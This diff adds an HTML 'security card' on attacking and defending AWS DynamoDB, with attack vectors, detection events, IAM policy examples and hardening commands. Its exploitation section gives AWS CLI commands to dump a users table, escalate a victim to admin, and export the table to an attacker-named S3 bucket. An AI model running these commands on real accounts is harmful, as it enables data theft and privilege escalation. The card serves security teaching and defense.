@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AWS DynamoDB Security | AWS Security Cards</title>
+<meta name="description" content="DynamoDB is a NoSQL database storing application data, session tokens, and configuration. Attackers exploit table policies, scan operations, and PartiQL queries to extract sensitive data.">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    background: #0a0e1a;
+    color: #e2e8f0;
+    line-height: 1.6;
+    padding: 2rem;
+    max-width: 1200px;
+    margin: 0 auto;
+  }
+  a { color: #22d3ee; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* Card Image */
+  .card-image {
+    border-radius: 1rem;
+    overflow: hidden;
+    margin-bottom: 2rem;
+    border: 1px solid rgba(255,255,255,0.1);
+  }
+  .card-image img {
+    width: 100%;
+    height: auto;
+    display: block;
+  }
+
+  /* Header */
+  .header {
+    position: relative;
+    overflow: hidden;
+    border-radius: 1rem;
+    background: linear-gradient(135deg, #f9731615, #0a0e1a, #ef444415);
+    border: 1px solid #f973164d;
+    padding: 2.5rem;
+    margin-bottom: 2rem;
+  }
+  .header::before {
+    content: '';
+    position: absolute;
+    top: 0; right: 0;
+    width: 24rem; height: 24rem;
+    background: #f973160d;
+    border-radius: 50%;
+    filter: blur(3rem);
+  }
+  .header-content { position: relative; display: flex; align-items: flex-start; gap: 1.5rem; }
+  .header-icon { width: 64px; height: 64px; flex-shrink: 0; }
+  .header-icon img { width: 100%; height: 100%; }
+  .header-title { font-size: 1.875rem; font-weight: 700; color: #fff; }
+  .header-badge {
+    display: inline-block;
+    padding: 0.25rem 0.75rem;
+    background: #f9731633;
+    color: #f97316;
+    font-size: 0.8rem;
+    font-weight: 600;
+    border-radius: 999px;
+    border: 1px solid #f973164d;
+    margin-left: 0.75rem;
+    vertical-align: middle;
+  }
+  .header-desc { color: #94a3b8; max-width: 42rem; margin-top: 0.5rem; }
+
+  /* Stats */
+  .stats-row { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1rem; margin-bottom: 2rem; }
+  .stat-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+    text-align: center;
+  }
+  .stat-value { font-size: 1.5rem; font-weight: 700; }
+  .stat-label { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Sections */
+  .section {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+  .section h2 {
+    font-size: 1.25rem;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 1rem;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  /* Overview */
+  .overview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .overview-grid h4 { font-size: 0.9rem; font-weight: 600; margin-bottom: 0.5rem; }
+  .overview-grid p { font-size: 0.875rem; color: #94a3b8; margin-bottom: 0.75rem; }
+  .attack-note {
+    background: rgba(0,0,0,0.3);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 0.75rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  /* Risk Gauge */
+  .risk-gauge { display: flex; align-items: center; gap: 2rem; }
+  .risk-bar-container { flex: 1; }
+  .risk-bar {
+    height: 1rem;
+    background: #0f172a;
+    border-radius: 999px;
+    overflow: hidden;
+  }
+  .risk-bar-fill {
+    height: 100%;
+    border-radius: 999px;
+    background: linear-gradient(90deg, #eab308, #f97316, #ef4444);
+  }
+  .risk-labels { display: flex; justify-content: space-between; font-size: 0.8rem; color: #94a3b8; margin-top: 0.5rem; }
+  .risk-score { text-align: center; }
+  .risk-score-value { font-size: 2.5rem; font-weight: 700; color: #f87171; }
+  .risk-score-label { font-size: 0.8rem; color: #94a3b8; }
+  .risk-desc { margin-top: 1rem; font-size: 0.875rem; color: #94a3b8; }
+
+  /* Panels Grid */
+  .panels-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin-bottom: 1.5rem; }
+  @media (max-width: 1024px) { .panels-grid { grid-template-columns: repeat(2, 1fr); } }
+  @media (max-width: 640px) { .panels-grid, .stats-row, .overview-grid { grid-template-columns: 1fr; } }
+  .panel {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.75rem;
+    border: 1px solid;
+    padding: 1.5rem;
+  }
+  .panel h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem; }
+  .panel h4 { font-size: 0.85rem; font-weight: 600; margin-bottom: 0.5rem; margin-top: 1rem; }
+  .panel ul { list-style: none; padding: 0; }
+  .panel li {
+    font-size: 0.85rem;
+    color: #cbd5e1;
+    padding: 0.15rem 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.5rem;
+  }
+  .bullet { margin-top: 0.15rem; }
+  .note {
+    margin-top: 1rem;
+    padding: 0.75rem;
+    border-radius: 0.5rem;
+    font-size: 0.85rem;
+  }
+
+  /* Commands */
+  .cmd-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .cmd-block { margin-top: 0.75rem; }
+  .cmd-title { font-size: 0.8rem; color: #94a3b8; margin-bottom: 0.25rem; }
+  pre {
+    background: rgba(0,0,0,0.5);
+    border-radius: 0.5rem;
+    padding: 0.75rem;
+    font-size: 0.8rem;
+    color: #4ade80;
+    overflow-x: auto;
+    border: 1px solid rgba(255,255,255,0.06);
+    white-space: pre-wrap;
+    word-break: break-all;
+    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+  }
+
+  /* Policies */
+  .policy-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.5rem; }
+  .policy-card {
+    border-radius: 0.5rem;
+    border: 1px solid;
+    padding: 1rem;
+  }
+  .policy-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.75rem; font-size: 0.9rem; }
+  .policy-card pre { margin-bottom: 0.75rem; color: #cbd5e1; }
+  .policy-desc { font-size: 0.8rem; color: #94a3b8; }
+
+  /* Defenses */
+  .defense-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  .defense-card {
+    background: rgba(255,255,255,0.03);
+    border-radius: 0.5rem;
+    border: 1px solid rgba(255,255,255,0.06);
+    padding: 1rem;
+  }
+  .defense-card:hover { border-color: #22d3ee4d; }
+  .defense-header { display: flex; align-items: flex-start; gap: 0.75rem; }
+  .defense-icon { font-size: 1.5rem; }
+  .defense-card h4 { font-size: 0.9rem; font-weight: 600; color: #fff; margin-bottom: 0.25rem; }
+  .defense-card p { font-size: 0.85rem; color: #94a3b8; margin-bottom: 0.5rem; }
+  .defense-card pre { color: #22d3ee; }
+
+  /* Footer */
+  .footer { text-align: center; padding: 1.5rem 0; font-size: 0.8rem; color: #64748b; }
+  .footer a { color: #22d3ee; }
+
+  /* Prevent ugly page-break splits */
+  .card-image,
+  .header,
+  .stat-card,
+  .stats-row,
+  .section,
+  .panel,
+  .cmd-block,
+  .policy-card,
+  .defense-card,
+  .attack-note,
+  .overview-grid > div,
+  .risk-gauge,
+  .note {
+    break-inside: avoid;
+    page-break-inside: avoid;
+  }
+  .section,
+  .panels-grid,
+  .card-image,
+  .header {
+    break-before: auto;
+    page-break-before: auto;
+  }
+  /* Keep headings with their content */
+  h2, h3, h4 {
+    break-after: avoid;
+    page-break-after: avoid;
+  }
+
+  @media print {
+    body { background: #0a0e1a; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
+    /* Switch panels to 2-col for better page flow */
+    .panels-grid { grid-template-columns: repeat(2, 1fr); }
+    /* Switch commands and policies to single column to avoid splits */
+    .cmd-grid { grid-template-columns: 1fr; }
+    .policy-grid { grid-template-columns: 1fr; }
+    .defense-grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<!-- Card Image -->
+<div class="card-image">
+  <img src="../images/dynamodb-card.webp" alt="AWS DynamoDB Security" />
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="header-content">
+    <div class="header-icon"><img src="../icons/dynamodb.svg" alt="AWS DynamoDB Security" /></div>
+    <div>
+      <div>
+        <span class="header-title">AWS DynamoDB Security</span>
+        <span class="header-badge">DATABASE</span>
+      </div>
+      <p class="header-desc">DynamoDB is a NoSQL database storing application data, session tokens, and configuration. Attackers exploit table policies, scan operations, and PartiQL queries to extract sensitive data.</p>
+    </div>
+  </div>
+</div>
+
+<!-- Stats -->
+<div class="stats-row">
+        <div class="stat-card">
+          <div class="stat-value" style="color: #f87171;">HIGH</div>
+          <div class="stat-label">Data Exposure Risk</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #4ade80;">15+</div>
+          <div class="stat-label">Attack Techniques</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #60a5fa;">PartiQL</div>
+          <div class="stat-label">SQL-like Queries</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-value" style="color: #c084fc;">TB+</div>
+          <div class="stat-label">Potential Data Theft</div>
+        </div></div>
+
+<!-- Overview -->
+<div class="section"><h2><span style="color:#f97316;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+        <div>
+          <h4 style="color: #f97316;">Data Model &amp; Access</h4>
+          <p>DynamoDB is a key-value and document NoSQL database. Tables store items indexed by partition keys and optional sort keys. Global Secondary Indexes (GSIs) provide alternate query paths that may expose data through different access patterns.</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> GSIs replicate table data with different key schemas - querying a GSI may bypass item-level access controls</div>
+        </div>
+        <div>
+          <h4 style="color: #f97316;">PartiQL &amp; Streams</h4>
+          <p>PartiQL provides SQL-compatible query access to DynamoDB. DynamoDB Streams capture item-level changes in near-real-time, feeding Lambda triggers and replication pipelines. Both are powerful attack surfaces for data exfiltration.</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> PartiQL SELECT * FROM table bypasses the need for Scan API calls and may evade scan-specific IAM denies</div>
+        </div></div></div>
+
+<!-- Risk Assessment -->
+
+<div class="section">
+  <h2>Security Risk Assessment</h2>
+  <div class="risk-gauge">
+    <div class="risk-bar-container">
+      <div class="risk-bar">
+        <div class="risk-bar-fill" style="width: 80%;"></div>
+      </div>
+      <div class="risk-labels"><span>Low</span><span>Medium</span><span>High</span><span>Critical</span></div>
+    </div>
+    <div class="risk-score">
+      <div class="risk-score-value">8.0</div>
+      <div class="risk-score-label">Risk Score</div>
+    </div>
+  </div>
+  <p class="risk-desc">DynamoDB tables frequently contain sensitive application data. Attackers with read access can extract PII, session tokens, and credentials. Write access enables privilege escalation via modified user records.</p>
+</div>
+
+<!-- Main Panels -->
+<div class="panels-grid">
+      <div class="panel" style="border-color: #f8717133;">
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Data Access</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Overly permissive IAM policies</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Resource-based table policies</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> GSI/LSI alternate query paths</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Streams exposing change data</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> PartiQL bypassing Scan denies</li></ul><h4 style="color: #f87171;">Data Manipulation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Session token modification (PutItem)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> User role escalation via item updates</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Feature flag tampering</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Backup export to attacker-controlled S3</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Table deletion for disruption</li></ul></div>
+      <div class="panel" style="border-color: #fb923c33;">
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Policy Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> dynamodb:* permissions on tables</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing fine-grained access control (leading keys)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No condition keys for item-level access</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> PartiQL execution without restrictions</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Resource policy allowing cross-account access</li></ul><h4 style="color: #fb923c;">Infrastructure Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Missing encryption at rest (default AWS key)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Point-in-time recovery disabled</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No VPC endpoint (traffic over public internet)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Streams readable by unintended consumers</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Global tables replicating to insecure regions</li></ul></div>
+      <div class="panel" style="border-color: #22d3ee33;">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3>
+        <div class="cmd-block">
+          <div class="cmd-title">List All Tables</div>
+          <pre><code>aws dynamodb list-tables</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Describe Table</div>
+          <pre><code>aws dynamodb describe-table --table-name users</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Global Tables</div>
+          <pre><code>aws dynamodb list-global-tables</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Backups</div>
+          <pre><code>aws dynamodb list-backups</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">List Streams</div>
+          <pre><code>aws dynamodbstreams list-streams</code></pre>
+        </div></div>
+      <div class="panel" style="border-color: #c084fc33;">
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">Direct Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Modify user role field to admin</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Update session tokens for privilege</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Alter feature flags for access</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Change API key permissions in table</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Insert admin user record</li></ul><h4 style="color: #c084fc;">GSI Bypass Attacks</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Query GSI to enumerate all users by email</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> GSI on role field reveals all admin accounts</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> GSI access may bypass partition key restrictions</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Sparse GSI reveals items with specific attributes</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> LSI provides alternate sort key enumeration</li></ul><div class="note"><strong>Key insight:</strong> If IAM restricts access by leading key on the base table, the same data may be queryable through a GSI with different key schema.</div></div>
+      <div class="panel" style="border-color: #facc1533;">
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Data Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Insert backdoor user into auth table</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add persistent API key record</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create scheduled export to attacker S3</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Enable streams and attach rogue Lambda</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add trigger for data replication</li></ul><h4 style="color: #facc15;">Stream-Based Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Attach Lambda trigger to stream</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Lambda exfiltrates every new/modified item</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Cross-region replication to attacker table</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Kinesis Data Firehose to attacker S3</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Survives credential rotation if Lambda persists</li></ul></div>
+      <div class="panel" style="border-color: #4ade8033;">
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Scan - bulk data read</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> ExportTableToPointInTime</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DeleteTable / DeleteBackup</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateTable (security changes)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateTableReplica</li></ul><h4 style="color: #4ade80;">Indicators of Compromise</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Scan operations from unusual IAM principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> PartiQL ExecuteStatement with SELECT *</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New stream consumers or Lambda triggers</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Export operations to unknown S3 buckets</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> High read capacity consumption spikes</li></ul></div></div>
+
+<!-- Exploitation -->
+<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
+          <div class="cmd-title">Full Table Scan (Data Theft)</div>
+          <pre><code>aws dynamodb scan --table-name users --output json &gt; exfil.json</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">PartiQL - Extract Admin Users</div>
+          <pre><code>aws dynamodb execute-statement \\
+  --statement &quot;SELECT * FROM users WHERE role='admin'&quot;</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Query GSI for Alternate Access</div>
+          <pre><code>aws dynamodb query --table-name users \\
+  --index-name email-index \\
+  --key-condition-expression 'email = :e' \\
+  --expression-attribute-values '{&quot;:e&quot;:{&quot;S&quot;:&quot;admin@corp.com&quot;}}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Modify User Role (Privesc)</div>
+          <pre><code>aws dynamodb update-item --table-name users \\
+  --key '{&quot;user_id&quot;:{&quot;S&quot;:&quot;victim&quot;}}' \\
+  --update-expression 'SET #r = :admin' \\
+  --expression-attribute-names '{&quot;#r&quot;:&quot;role&quot;}' \\
+  --expression-attribute-values '{&quot;:admin&quot;:{&quot;S&quot;:&quot;admin&quot;}}'</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Export Table to Attacker S3</div>
+          <pre><code>aws dynamodb export-table-to-point-in-time \\
+  --table-arn arn:aws:dynamodb:us-east-1:123456789012:table/users \\
+  --s3-bucket attacker-exfil-bucket</code></pre>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-title">Read Stream Records</div>
+          <pre><code>SHARD=$(aws dynamodbstreams describe-stream \\
+  --stream-arn &lt;stream-arn&gt; \\
+  --query 'StreamDescription.Shards[0].ShardId' --output text)
+ITER=$(aws dynamodbstreams get-shard-iterator \\
+  --stream-arn &lt;stream-arn&gt; --shard-id $SHARD \\
+  --shard-iterator-type TRIM_HORIZON --query 'ShardIterator' --output text)
+aws dynamodbstreams get-records --shard-iterator $ITER</code></pre>
+        </div></div></div>
+
+<!-- Policies -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - Full Access</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: &quot;dynamodb:*&quot;,
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Full DynamoDB access enables complete data exfiltration, table deletion, and stream hijacking</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Least Privilege with Leading Keys</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [&quot;dynamodb:GetItem&quot;, &quot;dynamodb:Query&quot;],
+  &quot;Resource&quot;: &quot;arn:aws:dynamodb:*:*:table/app-data&quot;,
+  &quot;Condition&quot;: {
+    &quot;ForAllValues:StringEquals&quot;: {
+      &quot;dynamodb:LeadingKeys&quot;: [&quot;\${aws:userId}&quot;]
+    }
+  }
+}</code></pre>
+          <p class="policy-desc">Limited to specific table with partition key scoped to the caller's identity</p>
+        </div>
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - PartiQL Without Restrictions</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;dynamodb:PartiQLSelect&quot;,
+    &quot;dynamodb:PartiQLUpdate&quot;,
+    &quot;dynamodb:PartiQLInsert&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">PartiQL access to all tables - SELECT * FROM any_table bypasses scan restrictions</p>
+        </div>
+        <div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
+          <div class="policy-header">
+            <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Deny Scan and Export</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Deny&quot;,
+  &quot;Action&quot;: [
+    &quot;dynamodb:Scan&quot;,
+    &quot;dynamodb:ExportTableToPointInTime&quot;,
+    &quot;dynamodb:PartiQLSelect&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringNotEquals&quot;: {
+      &quot;aws:PrincipalTag/team&quot;: &quot;data-engineering&quot;
+    }
+  }
+}</code></pre>
+          <p class="policy-desc">Explicit deny on bulk read operations except for authorized data team</p>
+        </div></div></div>
+
+<!-- Defenses -->
+<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">📋</span>
+            <div>
+              <h4>Enable CloudTrail Data Events</h4>
+              <p>Log all DynamoDB data plane operations (Scan, Query, GetItem) to detect unauthorized access.</p>
+              <pre><code>aws cloudtrail put-event-selectors \\
+  --trail-name main-trail \\
+  --advanced-event-selectors '[{&quot;FieldSelectors&quot;:[
+    {&quot;Field&quot;:&quot;eventCategory&quot;,&quot;Equals&quot;:[&quot;Data&quot;]},
+    {&quot;Field&quot;:&quot;resources.type&quot;,&quot;Equals&quot;:[&quot;AWS::DynamoDB::Table&quot;]}
+  ]}]'</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔐</span>
+            <div>
+              <h4>Encrypt with KMS CMK</h4>
+              <p>Use customer-managed KMS keys to control who can decrypt table data at rest.</p>
+              <pre><code>aws dynamodb create-table --table-name secure-data \\
+  --sse-specification Enabled=true,SSEType=KMS,KMSMasterKeyId=alias/dynamo-key</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🌐</span>
+            <div>
+              <h4>VPC Endpoints</h4>
+              <p>Keep DynamoDB traffic private via gateway endpoint - prevents data exfil over public internet.</p>
+              <pre><code>aws ec2 create-vpc-endpoint \\
+  --vpc-id vpc-xxx --service-name com.amazonaws.us-east-1.dynamodb \\
+  --route-table-ids rtb-xxx</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🔒</span>
+            <div>
+              <h4>Fine-Grained Access Control</h4>
+              <p>Use IAM condition keys to restrict access to specific partition keys per user.</p>
+              <pre><code>&quot;Condition&quot;: {&quot;ForAllValues:StringEquals&quot;: {
+  &quot;dynamodb:LeadingKeys&quot;: [&quot;\${aws:userId}&quot;]
+}}</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">🚫</span>
+            <div>
+              <h4>Deny Scan and PartiQL Select</h4>
+              <p>Explicitly deny Scan and PartiQL SELECT to prevent bulk data exfiltration.</p>
+              <pre><code>&quot;Effect&quot;: &quot;Deny&quot;,
+&quot;Action&quot;: [&quot;dynamodb:Scan&quot;, &quot;dynamodb:PartiQLSelect&quot;],
+&quot;Resource&quot;: &quot;arn:aws:dynamodb:*:*:table/sensitive-*&quot;</code></pre>
+            </div>
+          </div>
+        </div>
+        <div class="defense-card">
+          <div class="defense-header">
+            <span class="defense-icon">💾</span>
+            <div>
+              <h4>Enable PITR and Deletion Protection</h4>
+              <p>Point-in-time recovery protects against data loss. Deletion protection prevents table drops.</p>
+              <pre><code>aws dynamodb update-table --table-name users \\
+  --deletion-protection-enabled
+aws dynamodb update-continuous-backups --table-name users \\
+  --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true</code></pre>
+            </div>
+          </div>
+        </div></div></div>
+
+<!-- Footer -->
+<div class="footer">
+  <p>AWS DynamoDB Security Card</p>
+  <p style="margin-top:0.25rem;">Always obtain proper authorization before testing</p>
+</div>
+
+</body>
+</html>
